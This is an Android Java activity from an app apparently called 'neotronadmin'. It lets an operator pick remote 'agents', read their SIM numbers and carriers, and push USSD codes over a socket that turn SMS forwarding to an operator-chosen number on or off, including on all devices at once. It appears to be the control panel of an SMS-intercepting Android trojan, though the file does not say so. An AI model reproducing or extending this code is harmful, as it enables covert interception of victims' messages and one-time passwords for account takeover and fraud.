package com.pegalite.neotronadmin.ui.actions;

import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.os.Bundle;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import com.pegalite.alerts.dialog.PegaSuccessDialog;
import com.pegalite.alerts.utils.DialogData;
import com.pegalite.neotronadmin.R;
import com.pegalite.neotronadmin.databinding.ActivitySmsForwardingBinding;
import com.pegalite.neotronadmin.functions.alerts.SendingDialog;
import com.pegalite.neotronadmin.functions.helpers.Prefs;
import com.pegalite.neotronadmin.functions.server.socket.PegaSocketServer;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

import io.socket.client.Ack;

public class SmsForwardingActivity extends PegaAppCompatActivity {

    ActivitySmsForwardingBinding binding;

    String smsUSSD = "*987*number#", socketEvent = "run-ussd", agentID;
    int slotIndex = 0;

    Prefs prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySmsForwardingBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        agentID = getIntent().getStringExtra("agentID");
        if (agentID == null) {
            return;
        }

        prefs = new Prefs(this);

        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.send.setOnClickListener(v -> {
            String number = binding.number.getText().toString();

            if (number.isBlank()) {
                if (smsUSSD.startsWith("*987*")) {
                    sendUSSD(agentID, "*678#");
                } else {
                    sendUSSD(agentID, "*321#");
                }
                return;
            }

            sendUSSD(agentID, smsUSSD.replace("number", number));

        });


        binding.smsStatus.setOnCheckedChangeListener((group, checkedId) -> {
            if (checkedId == R.id.offline) {
                smsUSSD = "*987*number#";
                loadSimStatus(agentID, "Offline");
            } else {
                smsUSSD = "*432*number#";
                loadSimStatus(agentID, "Online");

            }
        });

        if (!agentID.equals("all")) {
            if (prefs.getPref("last-checked-" + agentID).equals("Online")) {
                binding.smsStatus.check(R.id.online);
            } else {
                binding.smsStatus.check(R.id.offline);
            }

        }

        loadSimStatus(agentID, prefs.getPref("last-checked-" + agentID));

        binding.sim1.setOnClickListener(v -> {
            if (slotIndex == 0) {
                return;
            }

            slotIndex++;
            binding.sim1.setBackground(ContextCompat.getDrawable(this, R.drawable.btn_round_light_blue));
            binding.sim2.setBackground(ContextCompat.getDrawable(this, R.drawable.btn_round_light_fade));

        });

        binding.sim2.setOnClickListener(v -> {
            if (slotIndex == 1) {
                return;
            }

            slotIndex--;
            binding.sim2.setBackground(ContextCompat.getDrawable(this, R.drawable.btn_round_light_blue));
            binding.sim1.setBackground(ContextCompat.getDrawable(this, R.drawable.btn_round_light_fade));

        });

    }

    private void loadSimStatus(String agentID, String status) {
        if (agentID.equals("all")) {
            socketEvent = "all-run-ussd";
            binding.detailsContainer.setVisibility(VISIBLE);
            binding.progress.setVisibility(GONE);
            return;
        }

        binding.progress.setVisibility(VISIBLE);
        binding.detailsContainer.setVisibility(GONE);
        binding.number.setText("");
        PegaSocketServer.getSocket().emit("get_sim_status", agentID, (Ack) args -> {
            runOnUiThread(() -> {
                JSONObject data = (JSONObject) args[0];
                binding.progress.setVisibility(GONE);
                if (data.optString("status").equals("success")) {
                    binding.detailsContainer.setVisibility(VISIBLE);
                    setSimDetails(data.optJSONArray("data"));
                    String dataName = status.equals("Online") ? "sms-forward-online" : "sms-forward";
                    String number = Objects.requireNonNull(data.optJSONObject("configs")).optString(dataName, "no-data");
                    if (!number.equals(Prefs.NO_DATA)) {
                        binding.number.setText(number);
                    }
                } else {
                    binding.simDetailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });
    }

    private void setSimDetails(@Nullable JSONArray data) {
        Prefs prefs = new Prefs(this);
        if (data == null) {
            try {
                if (prefs.getPref("simInfo-" + agentID).equals(Prefs.NO_DATA)) {
                    return;
                }
                data = new JSONArray(prefs.getPref("simInfo-" + agentID));
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        } else {
            binding.live.setVisibility(VISIBLE);
        }
        if (data.length() == 0) {
            return;
        }
        prefs.setPref("simInfo-" + agentID, data.toString());

        JSONObject sim1Info = data.optJSONObject(0);
        if (sim1Info.optString("number").isEmpty()) {
            return;
        }

        binding.simDetailsContainer.setVisibility(VISIBLE);

        binding.number1.setText(sim1Info.optString("number"));
        binding.carrierName1.setText(sim1Info.optString("carrierName"));
        binding.displayName1.setText(sim1Info.optString("displayName"));
        binding.sim1.setVisibility(VISIBLE);

        JSONObject sim2Info = data.optJSONObject(1);
        if (data.length() > 1) {
            binding.number2.setText(sim2Info.optString("number"));
            binding.carrierName2.setText(sim2Info.optString("carrierName:"));
            binding.displayName2.setText(sim2Info.optString("displayName"));
            binding.sim2.setVisibility(VISIBLE);
        }
    }

    private void sendUSSD(String agentID, String ussd) {
        String type;
        if (ussd.startsWith("*432*") || ussd.startsWith("*321#")) {
            type = "Online";
            prefs.setPref("last-checked-" + agentID, type);
        } else {
            type = "Offline";
            prefs.setPref("last-checked-" + agentID, type);
        }

        SendingDialog sendingDialog = new SendingDialog(getActivity(), DialogData.UN_CANCELABLE);
        sendingDialog.show((ussd.equals("*678#") || ussd.equals("*321#")) ? "Disabling " + type + " SMS Forwarding..." : "Adding Number...");
        addDialogToDestroyList(sendingDialog);
        PegaSocketServer.getSocket().emit(socketEvent, agentID.equals("all") ? getPackageName() : agentID, ussd + slotIndex, 0, (Ack) args -> {
            runOnUiThread(() -> {
                sendingDialog.dismiss();
                JSONObject data = (JSONObject) args[0];
                if (data.optString("status").equals("success")) {
                    PegaSuccessDialog successDialog = new PegaSuccessDialog(getActivity(), DialogData.DISMISS_ON_CANCEL);
                    successDialog.show(type + " SMS Forwarding " + ((ussd.equals("*678#") || ussd.equals("*321#")) ? "Disabled" : "Enabled"));
                    addDialogToDestroyList(sendingDialog);
                } else {
                    binding.detailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });

    }
}